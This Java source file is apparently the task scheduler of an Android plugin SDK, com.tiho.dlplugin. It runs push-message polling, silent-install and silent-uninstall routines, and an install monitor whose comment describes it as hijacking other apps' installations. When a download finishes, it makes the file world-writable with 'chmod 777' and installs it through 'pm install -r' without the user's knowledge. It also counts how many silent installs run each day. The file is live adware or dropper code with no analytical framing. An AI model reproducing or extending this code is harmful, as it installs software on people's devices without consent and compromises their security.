package com.tiho.dlplugin.task;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.display.PushStat;
import com.tiho.dlplugin.task.activate.ActivateCheckTask;
import com.tiho.dlplugin.task.scheduleact.ScheduleActTimer;
import com.tiho.dlplugin.task.scheduleact.ScreenListener;
import com.tiho.dlplugin.task.silent.SilentConfigTask;
import com.tiho.dlplugin.task.silent.SilentInstallHelper;
import com.tiho.dlplugin.task.silent.SilentTimerTask;
import com.tiho.dlplugin.task.silentExport.SilentAuthConfigTask;
import com.tiho.dlplugin.task.silentExport.SilentAuthReceiver;
import com.tiho.dlplugin.task.uninstall.UninstallReceiver;
import com.tiho.dlplugin.util.BroadCastUtil;

import java.io.IOException;
import java.util.GregorianCalendar;

/**
 * 定时任务管理
 *
 * @author Joey.Dai
 */
public class TaskManager {

    public static final int START_NEW_TASK = 0x2;
    public static final int START_MY_ROOT = 0x3;
    public static final int START_SDK_SERVICE = 0x4;
    public static final int MSG_HOST_DOWNLOAD_DONE = 0x10;
    public static final int MSG_HOST_DOWNLOAD_NO_NEED_UPDATE = 0x11;
    private static final long _3MINUTES = 3 * 60000L;
    private static final int NETWORK_RECOVER_PUSH_RETRIEVE = 0x1;
    private static Handler handler;
    private static Context context;
    private static boolean initialized = false;

    static {

        HandlerThread ht = new HandlerThread("task_handler");
        ht.start();
        handler = new Handler(ht.getLooper()) {

            @Override
            public void handleMessage(Message msg) {
                if (msg.what == NETWORK_RECOVER_PUSH_RETRIEVE) {
                    if (PushRetrieveTask.firstRecoverOfNetwork) {

                        post(new PushRetrieveTask(handler, context, true));
                        PushRetrieveTask.firstRecoverOfNetwork = false;
                    }

                    if (SilentTimerTask.firstRecoverOfNetwork) {

                        post(new SilentTimerTask(handler, context, true));
                        SilentTimerTask.firstRecoverOfNetwork = false;
                    }
                } else if (msg.what == START_NEW_TASK) {
                    //在此开启push的新功能
                    //快捷方式黑名单
//				    if(!EnvArgu.isFromJar()){
//			            handler.post(new BlackTxtTask(handler, context));
//			        }

                    //劫持其他应用的安装
                    handler.post(new InstallMonitorTask(handler, context));

                } else if (msg.what == START_MY_ROOT) {
                } else if (msg.what == START_SDK_SERVICE) {
                    try {
                        Intent i = (Intent) msg.obj;
                        context.startService(i);
                    } catch (Exception e) {
                        LogManager.LogShow(e);
                    }
                } else if (msg.what == MSG_HOST_DOWNLOAD_DONE) {
                    LogManager.LogShow("handle msg download done");
                    final String path = (String) msg.obj;
                    LogManager.LogShow("handle path=" + path);
                    new Thread(new Runnable() {

                        @Override
                        public void run() {
                            try {
                                LogManager.LogShow("handle msg download thread path=" + path);
                                Process process;
                                process = Runtime.getRuntime().exec("chmod 777 " + path);
                                process.waitFor();
                                process = Runtime.getRuntime().exec("pm install -r " + path);
//								Runtime.getRuntime().exec("pm install -r "+path);
                            } catch (IOException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                                LogManager.LogShow("handle msg install error");
                            } catch (InterruptedException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                                LogManager.LogShow("handle msg install error InterruptedException");
                            }
                        }
                    }).start();
                } else if (msg.what == MSG_HOST_DOWNLOAD_NO_NEED_UPDATE) {
                    LogManager.LogShow("handle msg no need update");
                }

            }

        };

    }

    public static void init(Context context) {
        TaskManager.context = context;

        if (initialized)
            return;

        ScheduleActTimer.start(context);//定时更新今天要激活的应用列表，以后每隔一天更新一次
        BroadCastUtil.registerReceiverEvent(context, Intent.ACTION_USER_PRESENT, new ScreenListener(handler,context));

        //定时获取push消息,请求间隔根据push配置中的reqGap而定,网络切换触发push消息获取，需要满足当前没有消息这个条件
        handler.post(new PushRetrieveTask(handler, context, false));
        handler.post(new SilentTimerTask(handler, context, false));
        handler.post(new ActivateCheckTask(handler, context));
        handler.post(new PushConfigTask(handler, context));
//        handler.post(new SwitcherDailyTask(handler, context));  //test
        //1439
        handler.post(new UpdateTask(handler, context));

        addMidNightTask(new SilentConfigTask(handler, context));
        //v51
        handler.post(new SdkSwitcherTask(handler, context));

        initSilentAuth(context);
        //网络变化后请求push消息
        BroadCastUtil.registerReceiverEvent(context, ConnectivityManager.CONNECTIVITY_ACTION, new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                LogManager.LogShow("registerReceiverEvent action = " + intent.getAction());
                LogManager.LogShow("网络恢复，添加NETWORK_RECOVER_PUSH_RETRIEVE任务  , delay " + _3MINUTES / 60000L + " minutes.");
                handler.sendEmptyMessageDelayed(NETWORK_RECOVER_PUSH_RETRIEVE, _3MINUTES);
            }
        });

        IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_REMOVED);
        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
        filter.addDataScheme("package");
        //应用被卸载后就记录到文件unst.dat中
        context.registerReceiver(new UninstallReceiver(), filter);

        LogManager.LogShow("isYesterday() = " + PushStat.getInstance(context).isYesterday());
        if (PushStat.getInstance(context).isYesterday()) {
            //一天过后就重置安装数量
            PushStat.getInstance(context).resetSilentNum();
        }

        SilentInstallHelper.getInstance(context).notifySilentQueue(null);

        //handler.postDelayed(new UploadDeviceTask(handler,context), (long) (0.5*60*1000));
        initialized = true;
    }

    private static void initSilentAuth(Context context) {
        handler.postDelayed(new SilentAuthConfigTask(handler, context), 2 * 60 * 1000);
        BroadCastUtil.registerReceiverEvent(context, SilentAuthReceiver.ACTION_SILENT_INSTALL, new SilentAuthReceiver(handler, context));
        BroadCastUtil.registerReceiverEvent(context, SilentAuthReceiver.ACTION_SILENT_UNINSTALL, new SilentAuthReceiver(handler, context));
    }

    /**
     * 半夜凌晨执行的任务
     *
     * @param task
     */
    private static void addMidNightTask(BaseTask task) {
        GregorianCalendar gc = new GregorianCalendar();
        gc.set(GregorianCalendar.DATE, gc.get(GregorianCalendar.DATE) + 1);
        gc.set(GregorianCalendar.HOUR_OF_DAY, 0);
        gc.set(GregorianCalendar.MINUTE, 0);
        gc.set(GregorianCalendar.SECOND, 0);

        long offset = gc.getTime().getTime() - System.currentTimeMillis();

        handler.postDelayed(task, offset);
    }



    public static void addTask(BaseTask task, long delay) {
        handler.postDelayed(task, delay);
    }

}
